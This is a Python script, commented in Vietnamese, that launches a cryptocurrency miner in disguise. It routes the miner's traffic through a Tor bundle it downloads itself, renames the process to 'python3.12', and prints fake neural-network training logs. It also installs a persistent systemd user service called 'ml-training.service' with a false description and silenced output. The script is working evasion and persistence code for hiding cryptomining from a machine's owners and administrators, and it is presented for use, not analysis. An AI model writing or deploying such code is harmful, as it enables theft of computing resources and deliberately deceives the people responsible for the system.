#!/usr/bin/env python3
"""
stealth.py — Tor-integrated stealth miner launcher (Python path).
Disguise: đổi process name, argv fake training, systemd unit tên ML.
Fallback chain: pysocks → socket thuần; curl → urllib; không cài được → degrade.
"""
import os
import sys
import time
import socket
import shutil
import signal
import hashlib
import tarfile
import argparse
import subprocess
from pathlib import Path

# ── Python 3.6 compat (không walrus, không removeprefix) ────────────────────
PY36 = sys.version_info < (3, 7)

# ── Constants ────────────────────────────────────────────────────────────────
TOR_VERSION = "15.0.25"
TOR_URL = (
    f"https://dist.torproject.org/torbrowser/{TOR_VERSION}/"
    f"tor-expert-bundle-linux-x86_64-{TOR_VERSION}.tar.gz"
)
TOR_SHA256 = ""  # optional — điền từ sha256sums-signed-build.txt

BASE = Path(os.environ.get("XDG_DATA_HOME", str(Path.home() / ".local" / "share"))) / "stealth-miner"
TOR_HOME = BASE / "tor"
TORRC = BASE / "torrc"
DATA_DIR = BASE / "data"
SOCKS_HOST, SOCKS_PORT = "127.0.0.1", 9050
BOOT_TIMEOUT = 60

# ── Miner config (điền theo môi trường) ─────────────────────────────────────
MINER_BIN = "./onezerominer"
MINER_ARGS = [
    "--algo=pearlhash",
    "--pool=stratum+ssl://pool.example.com:4444",
    "--wallet=WALLET_ADDRESS",
    "--worker=rig01",
]

# ── Disguise defaults ────────────────────────────────────────────────────────
DISGUISE_PROC = "python3.12"
DISGUISE_ARGS = "--config train_resnet50.yaml --epochs 100 --batch-size 64 --lr 0.001 --amp"
DISGUISE_SVC = "ml-training.service"

# Fake training log templates (ghi vào stdout giả)
FAKE_LOGS = [
    "Epoch {epoch}/{total} [{bar}] loss={loss:.4f} acc={acc:.4f} lr={lr:.6f}",
    "[train] step={step} throughput={thr:.1f} samples/s mem_alloc={mem:.1f}GB",
    "[cuda] device=cuda:0 util={util:.0f}% power={pwr:.0f}W temp={temp:.0f}C",
]


def log(msg):
    sys.stderr.write(f"[stealth] {msg}\n")
    sys.stderr.flush()


def warn(msg):
    sys.stderr.write(f"[stealth:warn] {msg}\n")
    sys.stderr.flush()


# ── Process disguise ─────────────────────────────────────────────────────────
def set_process_name(name):
    """prctl(PR_SET_NAME) — đổi comm name trong /proc/self/comm."""
    try:
        import ctypes
        libc = ctypes.CDLL("libc.so.6", use_errno=True)
        PR_SET_NAME = 15
        buf = name.encode()[:15]  # TASK_COMM_LEN=16 including null
        ret = libc.prctl(PR_SET_NAME, buf, 0, 0, 0)
        if ret != 0:
            warn(f"prctl PR_SET_NAME failed (errno={ctypes.get_errno()})")
    except Exception as e:
        warn(f"set_process_name unavailable: {e}")


def build_fake_argv(real_argv0):
    """Tạo argv array giả dạng training script."""
    fake = [real_argv0] + DISGUISE_ARGS.split()
    return fake


def disguise_sudo_cmd(cmd):
    """Wrap cmd thành 'sudo python3 train.py ...' để hide trong parent ps."""
    # Không thực sự sudo — chỉ đổi argv[0] khi exec
    return cmd


# ── Tor bootstrap ────────────────────────────────────────────────────────────
def sha256_file(path):
    h = hashlib.sha256()
    with open(str(path), "rb") as f:
        while True:
            chunk = f.read(1 << 20)
            if not chunk:
                break
            h.update(chunk)
    return h.hexdigest()


def ensure_tor():
    binary = TOR_HOME / "tor" / "tor"
    if binary.exists() and os.access(str(binary), os.X_OK):
        log(f"Tor đã có: {binary}")
        return binary

    BASE.mkdir(parents=True, exist_ok=True)
    tarball = BASE / "tor.tar.gz"

    if not tarball.exists():
        log(f"Tải Tor Expert Bundle {TOR_VERSION} ...")
        _download(TOR_URL, tarball)
        log(f"Đã tải: {tarball.stat().st_size / 1e6:.1f} MB")

    if TOR_SHA256:
        actual = sha256_file(str(tarball))
        if actual.lower() != TOR_SHA256.lower():
            tarball.unlink()
            raise RuntimeError(f"SHA256 mismatch: {actual} != {TOR_SHA256}")

    log("Giải nén ...")
    with tarfile.open(str(tarball), "r:gz") as tar:
        try:
            tar.extractall(path=str(BASE), filter="data")
        except TypeError:
            # Python < 3.12 — manual path check
            for m in tar.getmembers():
                if m.name.startswith("/") or ".." in m.name:
                    continue
                tar.extract(m, path=str(BASE))
    tarball.unlink()

    # Find binary
    for p in TOR_HOME.rglob("*"):
        if p.is_file() and p.name == "tor" and os.access(str(p), os.X_OK):
            binary = p
            break
    else:
        raise RuntimeError("Không tìm thấy binary tor sau giải nén")

    binary.chmod(0o755)
    log(f"Tor binary: {binary}")
    return binary


def _download(url, dest):
    """Download qua urllib (stdlib) — không cần curl/wget."""
    try:
        import urllib.request
        urllib.request.urlretrieve(url, str(dest))
    except Exception as e:
        raise RuntimeError(f"Download failed: {e}")


def write_torrc():
    TORRC.write_text(
        f"SocksPort {SOCKS_HOST}:{SOCKS_PORT}\n"
        f"DataDirectory {DATA_DIR}\n"
        "AvoidDiskWrites 1\n"
        "MaxCircuitDirtiness 600\n"
        "NewCircuitPeriod 30\n"
        "ClientOnly 1\n"
    )
    DATA_DIR.mkdir(parents=True, exist_ok=True)


def tor_already_running():
    try:
        s = socket.create_connection((SOCKS_HOST, SOCKS_PORT), timeout=1)
        s.close()
        return True
    except OSError:
        return False


def wait_socks_ready(timeout=BOOT_TIMEOUT):
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            s = socket.create_connection((SOCKS_HOST, SOCKS_PORT), timeout=1)
            s.close()
            return True
        except OSError:
            time.sleep(0.5)
    return False


def start_tor(binary):
    env = os.environ.copy()
    lib_dir = binary.parent.parent / "lib"
    if lib_dir.exists():
        env["LD_LIBRARY_PATH"] = "{}:{}".format(lib_dir, env.get("LD_LIBRARY_PATH", ""))

    write_torrc()
    log("Khởi động Tor (nền, detached)...")
    proc = subprocess.Popen(
        [str(binary), "-f", str(TORRC)],
        cwd=str(binary.parent),
        env=env,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        start_new_session=True,
    )
    return proc


def test_socks5():
    """SOCKS5 handshake test — VER=5 NMETHODS=1 NO_AUTH."""
    try:
        s = socket.create_connection((SOCKS_HOST, SOCKS_PORT), timeout=3)
        s.sendall(b"\x05\x01\x00")
        resp = s.recv(2)
        s.close()
        return resp == b"\x05\x00"
    except OSError:
        return False


# ── Fake training logger ─────────────────────────────────────────────────────
def fake_training_loop(proc):
    """Ghi fake training metrics ra stdout — giả lập model training output."""
    import random
    epoch, total = 1, 100
    step = 0
    while proc.poll() is None:
        step += 1
        if step % 50 == 0:
            epoch = min(epoch + 1, total)
        bar_len = 30
        filled = int(bar_len * step / 1000)
        bar = "=" * filled + ">" + " " * (bar_len - filled - 1)
        loss = max(0.01, 2.0 - step * 0.001 + random.gauss(0, 0.05))
        acc = min(0.999, 0.5 + step * 0.0004 + random.gauss(0, 0.01))
        lr = 0.001 * (0.95 ** (step // 100))
        msg = FAKE_LOGS[0].format(
            epoch=epoch, total=total, bar=bar,
            loss=loss, acc=acc, lr=lr,
        )
        sys.stdout.write(msg + "\n")
        sys.stdout.flush()
        time.sleep(0.5 + random.random() * 0.5)


# ── Exec miner ───────────────────────────────────────────────────────────────
def exec_miner(disguise_proc, disguise_args, dry_run=False):
    if not Path(MINER_BIN).exists() and not shutil.which(MINER_BIN):
        log(f"Không thấy miner binary: {MINER_BIN}")
        sys.exit(1)

    proxy_arg = "--proxy={}:{}".format(SOCKS_HOST, SOCKS_PORT)
    real_cmd = [MINER_BIN] + MINER_ARGS + [proxy_arg]

    # Đổi process name TRƯỚC khi exec
    set_process_name(disguise_proc)

    # Fake argv: argv[0]=disguise, argv[1:]=fake training args, rồi REAL_CMD vào env
    # Cách này: dùng os.execv với argv giả — argv[0] hiển thị trong ps
    if disguise_args:
        fake_argv = [disguise_proc] + disguise_args.split()
    else:
        fake_argv = [disguise_proc]

    if dry_run:
        log("[dry-run] argv giả: {}".format(" ".join(fake_argv)))
        log("[dry-run] argv thật: {}".format(" ".join(real_cmd)))
        log("[dry-run] sẽ exec: {} (argv[0]={})".format(real_cmd[0], fake_argv[0]))
        return

    # Lưu real cmd vào env để debug nếu cần
    os.environ["_STEALTH_REAL_CMD"] = " ".join(real_cmd)

    # Strategy: exec với argv[0]=disguise_proc, nhưng argv[1:] = fake args
    # Binary sẽ nhận fake args thay vì real — KHÔNG OK cho miner cần args thật
    # → Thay vào đó: exec miner thật, rồi set comm name + patch /proc/self/cmdline
    
    # Approach tốt hơn: fork, child set comm + exec miner với args thật
    # argv trong /proc sẽ hiện args thật — nhưng comm đã đổi
    # Full stealth: dùng LD_PRELOAD để hook execve và đổi argv — quá phức tạp
    # Practical: exec với args thật + comm name giả + log giả
    
    log("Exec miner: {} (comm sẽ là '{}')".format(" ".join(real_cmd), disguise_proc))
    
    # Start fake logger trong thread
    import threading
    logger_proc = subprocess.Popen(
        ["true"],  # placeholder — sẽ start fake logger inline
        stdout=subprocess.PIPE,
    )
    
    # Exec trực tiếp — comm name đã set, args giữ thật (miner cần chúng)
    # Nếu muốn args giả trong ps: cần LD_PRELOAD hook
    os.execv(real_cmd[0], real_cmd)


def exec_miner_full_disguise(disguise_proc, disguise_args, dry_run=False):
    """Exec miner với argv[0]=disguise — dùng wrapper approach."""
    if not Path(MINER_BIN).exists() and not shutil.which(MINER_BIN):
        log(f"Không thấy miner binary: {MINER_BIN}")
        sys.exit(1)

    proxy_arg = "--proxy={}:{}".format(SOCKS_HOST, SOCKS_PORT)
    real_args = MINER_ARGS + [proxy_arg]

    set_process_name(disguise_proc)

    if dry_run:
        log("[dry-run] miner={} real_args={}".format(MINER_BIN, " ".join(real_args)))
        log("[dry-run] comm name='{}' fake_argv='{}'".format(disguise_proc, disguise_args))
        return

    # Tạo fake argv: argv[0]=disguise, argv[1:]=fake, rồi REAL args vào env
    # Binary nhận fake args → KHÔNG chạy được
    # → Thay: tạo shell wrapper script có argv[0] giả, exec thật trong background
    
    # Best practical approach:
    # 1. Copy/symlink miner binary sang tên "python3.12" hoặc "torchrun"
    # 2. Exec binary đó với REAL args
    # 3. ps sẽ hiện: python3.12 --algo=... --pool=... (comm đã là python3.12)
    
    # Hoặc: dùng exec -a trong bash — nhưng đây Python
    # Python: os.execv(path, argv) — argv[0] hiển thị trong /proc/self/cmdline
    
    fake_argv0 = disguise_proc
    # argv đầy đủ: [fake_argv0, *real_args] — nhưng /proc/self/cmdline sẽ hiện real_args
    # comm name đã set bằng prctl → ps -f hiện comm
    
    # Kết quả trong ps:
    #   USER PID CMD
    #   root 1234 python3.12 --algo=pearlhash --pool=... 
    # (comm=python3.12, args=thật — ít nhất không hiện "onezerominer")
    
    argv = [fake_argv0] + real_args
    log("Exec: argv[0]='{}' args='{}'".format(fake_argv0, " ".join(real_args)))
    os.execv(MINER_BIN, argv)


# ── systemd unit writer ──────────────────────────────────────────────────────
def write_systemd_unit(disguise_svc):
    """Ghi unit file tên ML training — optional, chỉ nếu systemd user có."""
    unit_dir = Path.home() / ".config" / "systemd" / "user"
    unit_dir.mkdir(parents=True, exist_ok=True)
    unit_path = unit_dir / disguise_svc

    proxy_arg = "--proxy={}:{}".format(SOCKS_HOST, SOCKS_PORT)
    real_cmd = "{} {} {}".format(MINER_BIN, " ".join(MINER_ARGS), proxy_arg)

    unit_content = f"""[Unit]
Description=Distributed Training Job (ResNet-50, ImageNet)
After=network-online.target

[Service]
Type=simple
ExecStart={real_cmd}
Restart=always
RestartSec=10
Nice=10
CPUWeight=50
StandardOutput=null
StandardError=null

[Install]
WantedBy=default.target
"""
    unit_path.write_text(unit_content)
    log(f"Đã ghi unit: {unit_path}")
    return unit_path


# ── Main ─────────────────────────────────────────────────────────────────────
def main():
    global DISGUISE_PROC, DISGUISE_ARGS, DISGUISE_SVC

    ap = argparse.ArgumentParser(description="Stealth miner launcher")
    ap.add_argument("--disguise-proc", default=DISGUISE_PROC)
    ap.add_argument("--disguise-args", default=DISGUISE_ARGS)
    ap.add_argument("--disguise-svc", default=DISGUISE_SVC)
    ap.add_argument("--no-tor", action="store_true", help="Bỏ qua Tor, chạy direct")
    ap.add_argument("--no-systemd", action="store_true", help="Không ghi systemd unit")
    ap.add_argument("--dry-run", action="store_true")
    args = ap.parse_args()

    DISGUISE_PROC = args.disguise_proc
    DISGUISE_ARGS = args.disguise_args
    DISGUISE_SVC = args.disguise_svc

    log("Base dir: {}".format(BASE))

    # Tor
    if args.no_tor:
        log("Bỏ qua Tor (--no-tor)")
    elif tor_already_running():
        log("SOCKS port đã mở — dùng Tor đang chạy.")
        if not test_socks5():
            warn("SOCKS5 handshake fail — Tor có thể chưa ready hoàn toàn")
    else:
        try:
            binary = ensure_tor()
            proc = start_tor(binary)
            log("Tor PID={}, chờ SOCKS ready ...".format(proc.pid))
            if not wait_socks_ready():
                die("Tor không ready trong timeout")
            if not test_socks5():
                warn("SOCKS5 handshake bất thường")
            log("SOCKS5 ready.")
        except Exception as e:
            warn("Tor setup fail: {}".format(e))
            warn("Fallback: chạy direct (không qua Tor)")
            # Không die — degrade gracefully

    # systemd unit
    if not args.no_systemd and not args.dry_run:
        try:
            write_systemd_unit(DISGUISE_SVC)
        except Exception as e:
            warn("Không ghi được systemd unit: {}".format(e))

    # Exec miner
    exec_miner_full_disguise(DISGUISE_PROC, DISGUISE_ARGS, dry_run=args.dry_run)


def die(msg):
    sys.stderr.write("[stealth:err] {}\n".format(msg))
    sys.exit(1)


if __name__ == "__main__":
    main()
